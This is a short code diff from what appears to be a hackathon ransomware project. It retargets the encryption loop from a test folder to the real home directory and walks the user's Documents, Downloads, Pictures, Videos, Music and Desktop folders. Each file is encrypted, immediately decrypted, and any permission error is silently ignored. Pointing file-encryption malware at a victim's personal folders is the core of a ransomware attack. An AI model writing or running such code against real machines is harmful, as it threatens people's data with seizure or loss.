@@ -55,7 +55,7 @@ def list_files(path):
 
 # Get home directory
 home_path = os.path.expanduser('~')
-home_path = "/home/luke/Downloads/HackathonSpring2022/Ransomwarer/test/"
+home_path = home_path + "/"
 
 directories_to_encrypt = ["Documents/", "Downloads/",
                           "Pictures/", "Videos/", "Music/", "Desktop/"]
@@ -66,6 +66,8 @@ for directory in directories_to_encrypt:
     print(files)
 
     for f in files:
-        encrypt(f)
-        time.sleep(5)
-        decrypt_file(f)
+        try:
+            encrypt(f)
+            decrypt_file(f)
+        except PermissionError:
+            pass
